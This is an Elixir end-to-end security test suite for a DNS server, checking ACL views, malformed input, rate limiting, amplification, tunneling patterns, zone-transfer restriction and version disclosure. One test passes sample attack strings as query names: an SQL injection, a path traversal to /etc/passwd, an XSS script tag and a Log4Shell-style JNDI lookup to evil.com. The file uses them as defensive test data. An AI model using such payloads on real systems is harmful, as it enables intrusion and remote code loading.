defmodule YellowDog.Dns.SecurityE2ETest do
  @moduledoc """
  Security-focused end-to-end tests for DNS server.

  Tests various security scenarios including:
  - Input validation and sanitization
  - ACL bypass attempts
  - Rate limiting and DoS protection
  - Query amplification attacks
  - DNS tunneling detection
  - DNSSEC validation (future)
  """

  use ExUnit.Case, async: false

  @moduletag :e2e
  @moduletag :dns
  @moduletag :security

  alias E2ETest.Support.{ServiceHelper, DnsClient}

  setup do
    # Start DNS server with security-focused configuration
    config = %{
      views: [
        %{
          name: "internal",
          priority: 10,
          acls: ["192.168.0.0/24"]
        },
        %{
          name: "external",
          priority: 20,
          acls: ["any"]
        }
      ],
      zones: [
        %{
          view: "internal",
          name: "internal.example.com",
          type: :auth,
          records: [
            %{name: "@", type: :A, ttl: 300, data: "192.168.1.10"},
            %{name: "secret", type: :A, ttl: 300, data: "192.168.1.100"}
          ]
        },
        %{
          view: "external",
          name: "example.com",
          type: :auth,
          records: [
            %{name: "@", type: :A, ttl: 300, data: "203.0.113.10"},
            %{name: "www", type: :A, ttl: 300, data: "203.0.113.11"}
          ]
        }
      ],
      rate_limit: %{
        enabled: true,
        queries_per_second: 100,
        burst: 200
      }
    }

    {:ok, ctx} = ServiceHelper.start_dns_server(config: config)
    on_exit(fn -> ServiceHelper.stop_service(ctx) end)
    {:ok, ctx}
  end

  describe "ACL enforcement" do
    test "blocks access to internal zone from external IP", ctx do
      # Try to query internal zone from external IP (8.8.8.8)
      {:ok, response} =
        DnsClient.query(
          ctx.host,
          ctx.port,
          "secret.internal.example.com",
          :A,
          source_ip: {8, 8, 8, 8}
        )

      # Should get REFUSED or NXDOMAIN since external view doesn't have this zone
      assert response.rcode in [:refused, :nxdomain]
    end

    test "allows access to internal zone from internal IP", ctx do
      # Query internal zone from internal IP
      {:ok, response} =
        DnsClient.query(
          ctx.host,
          ctx.port,
          "secret.internal.example.com",
          :A,
          source_ip: {192, 168, 0, 100}
        )

      # Should succeed
      assert response.rcode == :noerror
      assert length(response.answers) > 0
    end

    test "allows access to external zone from any IP", ctx do
      # External zone should be accessible from any IP
      {:ok, response} =
        DnsClient.query(
          ctx.host,
          ctx.port,
          "www.example.com",
          :A,
          source_ip: {8, 8, 8, 8}
        )

      assert response.rcode == :noerror
      assert length(response.answers) > 0
    end
  end

  describe "input validation" do
    test "rejects malformed domain names", ctx do
      # Test various malformed domain names
      malformed_names = [
        "..example.com",
        # Double dots
        "example..com",
        # Double dots in middle
        ".example.com",
        # Leading dot (technically valid but suspicious)
        "example.com.",
        # Trailing dot (valid)
        "exam ple.com",
        # Space in domain
        "example$.com",
        # Invalid character
        String.duplicate("a", 64) <> ".com",
        # Label too long (>63 chars)
        String.duplicate("a.", 128) <> "com"
        # Domain too long (>253 chars)
      ]

      results =
        Enum.map(malformed_names, fn name ->
          case DnsClient.query(ctx.host, ctx.port, name, :A) do
            {:ok, response} -> {name, response.rcode}
            {:error, _reason} -> {name, :error}
          end
        end)

      # Server should handle these gracefully (not crash)
      # Most should return FORMERR or NXDOMAIN
      Enum.each(results, fn {name, rcode} ->
        assert rcode in [:formerr, :nxdomain, :servfail, :error],
               "#{name} should be rejected, got: #{rcode}"
      end)
    end

    test "rejects excessively large queries", ctx do
      # Try to query with extremely long domain name
      long_name = String.duplicate("a", 300) <> ".example.com"

      result = DnsClient.query(ctx.host, ctx.port, long_name, :A)

      case result do
        {:ok, response} ->
          assert response.rcode in [:formerr, :nxdomain]

        {:error, _reason} ->
          # Connection error is acceptable
          assert true
      end
    end

    test "handles special characters in queries", ctx do
      # Test SQL injection-style strings (shouldn't affect DNS but good to test)
      special_names = [
        "'; DROP TABLE zones--",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}"
      ]

      Enum.each(special_names, fn name ->
        result = DnsClient.query(ctx.host, ctx.port, name, :A)

        # Server should handle gracefully
        case result do
          {:ok, response} ->
            assert response.rcode in [:formerr, :nxdomain, :servfail]

          {:error, _} ->
            assert true
        end
      end)
    end

    test "validates query types", ctx do
      # Test with invalid query type value
      # This requires raw DNS packet construction
      # For now, test with uncommon but valid types
      uncommon_types = [:ANY, :AXFR, :IXFR, :OPT]

      Enum.each(uncommon_types, fn type ->
        result = DnsClient.query(ctx.host, ctx.port, "example.com", type)

        case result do
          {:ok, response} ->
            # Server should respond appropriately
            assert response.rcode in [:noerror, :nxdomain, :refused, :notimpl]

          {:error, _} ->
            # Some types may not be supported
            assert true
        end
      end)
    end
  end

  describe "rate limiting" do
    @tag :slow
    test "rate limits excessive queries from single IP", ctx do
      # Send burst of queries (more than configured limit)
      source_ip = {10, 0, 0, 1}
      query_count = 250

      # Burst requests quickly
      start_time = System.monotonic_time(:millisecond)

      results =
        Enum.map(1..query_count, fn i ->
          DnsClient.query(
            ctx.host,
            ctx.port,
            "test#{i}.example.com",
            :A,
            source_ip: source_ip
          )
        end)

      end_time = System.monotonic_time(:millisecond)
      duration_ms = end_time - start_time

      # Count refused/servfail responses (rate limited)
      {limited, successful} =
        Enum.reduce(results, {0, 0}, fn result, {limited, successful} ->
          case result do
            {:ok, %{rcode: rcode}} when rcode in [:refused, :servfail] ->
              {limited + 1, successful}

            {:ok, _} ->
              {limited, successful + 1}

            {:error, _} ->
              {limited + 1, successful}
          end
        end)

      IO.puts(
        "\n  Rate limit test: #{successful} successful, #{limited} limited in #{duration_ms}ms"
      )

      # Expect some queries to be rate limited if burst exceeded
      # With limit of 100 QPS + 200 burst, over 250 rapid queries should trigger limiting
      assert limited > 0 or successful < query_count,
             "Expected some rate limiting to occur"
    end
  end

  describe "query amplification prevention" do
    test "limits response size for ANY queries", ctx do
      # ANY queries can be used for amplification attacks
      {:ok, response} = DnsClient.query(ctx.host, ctx.port, "example.com", :ANY)

      # Response should be limited or return specific records only
      # Calculate approximate response size
      record_count = length(response.answers) + length(response.authority) + length(response.additional)

      # Response shouldn't be excessively large
      assert record_count < 100, "ANY query response too large: #{record_count} records"
    end

    test "limits response size for normal queries", ctx do
      {:ok, response} = DnsClient.query(ctx.host, ctx.port, "www.example.com", :A)

      # Normal query shouldn't return excessive records
      total_records =
        length(response.answers) + length(response.authority) + length(response.additional)

      assert total_records < 50, "Response too large: #{total_records} records"
    end
  end

  describe "DNS tunneling detection" do
    @tag :slow
    test "detects suspicious query patterns", ctx do
      # Simulate DNS tunneling with many subdomain queries
      base_domain = "example.com"

      # Generate 50 queries with long, random-looking subdomains
      queries =
        Enum.map(1..50, fn i ->
          # Simulate base64-like encoded data in subdomain
          subdomain = Base.encode64(:crypto.strong_rand_bytes(20)) |> String.replace(~r/[^a-z0-9]/i, "")
          "#{subdomain}.#{base_domain}"
        end)

      # Send queries
      results =
        Enum.map(queries, fn domain ->
          DnsClient.query(ctx.host, ctx.port, domain, :A)
        end)

      # All queries should complete (no crash)
      # In production, these patterns might trigger alerts
      assert length(results) == 50

      # At minimum, server should handle these gracefully
      Enum.each(results, fn result ->
        case result do
          {:ok, response} ->
            assert response.rcode in [:noerror, :nxdomain]

          {:error, _} ->
            assert true
        end
      end)
    end

    test "handles rapid unique subdomain queries", ctx do
      # Another tunneling indicator: many unique subdomains in short time
      subdomains = Enum.map(1..30, fn i -> "test#{i}-#{:rand.uniform(999999)}" end)

      results =
        Enum.map(subdomains, fn subdomain ->
          DnsClient.query(ctx.host, ctx.port, "#{subdomain}.example.com", :A)
        end)

      # Server should handle without crashing
      assert length(results) == 30
    end
  end

  describe "resource exhaustion prevention" do
    test "limits concurrent queries", ctx do
      # Spawn many concurrent queries
      tasks =
        Enum.map(1..100, fn i ->
          Task.async(fn ->
            DnsClient.query(ctx.host, ctx.port, "concurrent#{i}.example.com", :A)
          end)
        end)

      # Wait for all with timeout
      results = Task.await_many(tasks, 10_000)

      # All should complete (server doesn't crash under load)
      assert length(results) == 100

      # Most should succeed or be rate limited gracefully
      success_count =
        Enum.count(results, fn result ->
          match?({:ok, %{rcode: :noerror}}, result) or
            match?({:ok, %{rcode: :nxdomain}}, result)
        end)

      # At least 50% should succeed
      assert success_count >= 50
    end

    test "handles slow-read attacks", ctx do
      # This would require low-level socket manipulation
      # For now, test that normal queries don't hang
      {:ok, response} = DnsClient.query(ctx.host, ctx.port, "example.com", :A, timeout: 5000)

      assert response.rcode in [:noerror, :nxdomain]
    end
  end

  describe "cache poisoning prevention" do
    test "validates response authenticity", ctx do
      # Cache poisoning typically involves spoofed responses
      # This requires DNSSEC or other validation mechanisms
      # For now, verify server properly handles queries

      # Query a domain
      {:ok, response1} = DnsClient.query(ctx.host, ctx.port, "www.example.com", :A)
      # Query again (should be cached)
      {:ok, response2} = DnsClient.query(ctx.host, ctx.port, "www.example.com", :A)

      # Responses should be consistent
      assert response1.rcode == response2.rcode
      assert length(response1.answers) == length(response2.answers)
    end
  end

  describe "zone transfer security" do
    test "restricts AXFR to authorized clients", ctx do
      # AXFR should be restricted
      result = DnsClient.query(ctx.host, ctx.port, "example.com", :AXFR, tcp: true)

      case result do
        {:ok, response} ->
          # Should be refused unless authorized
          assert response.rcode in [:refused, :notimpl]

        {:error, _} ->
          # Connection error is acceptable
          assert true
      end
    end

    test "restricts IXFR to authorized clients", ctx do
      # IXFR should also be restricted
      result = DnsClient.query(ctx.host, ctx.port, "example.com", :IXFR, tcp: true)

      case result do
        {:ok, response} ->
          assert response.rcode in [:refused, :notimpl]

        {:error, _} ->
          assert true
      end
    end
  end

  describe "information disclosure" do
    test "limits version information exposure", ctx do
      # Query for version.bind (common recon technique)
      result = DnsClient.query(ctx.host, ctx.port, "version.bind", :TXT, class: :CH)

      case result do
        {:ok, response} ->
          # If implemented, shouldn't reveal detailed version
          if response.rcode == :noerror and length(response.answers) > 0 do
            [answer | _] = response.answers
            # Version string shouldn't be overly detailed
            version_text = to_string(answer.rdata)
            refute version_text =~ "debug"
            refute version_text =~ "devel"
          else
            # No version exposure is better
            assert response.rcode in [:nxdomain, :refused, :notimpl]
          end

        {:error, _} ->
          # No version exposure
          assert true
      end
    end

    test "doesn't leak internal network information in errors", ctx do
      # Query non-existent domain
      {:ok, response} = DnsClient.query(ctx.host, ctx.port, "nonexistent.internal.example.com", :A, source_ip: {8, 8, 8, 8})

      # Error responses shouldn't contain internal IP addresses or paths
      # This is a basic check - real validation would inspect additional sections
      assert response.rcode in [:nxdomain, :refused]
    end
  end
end
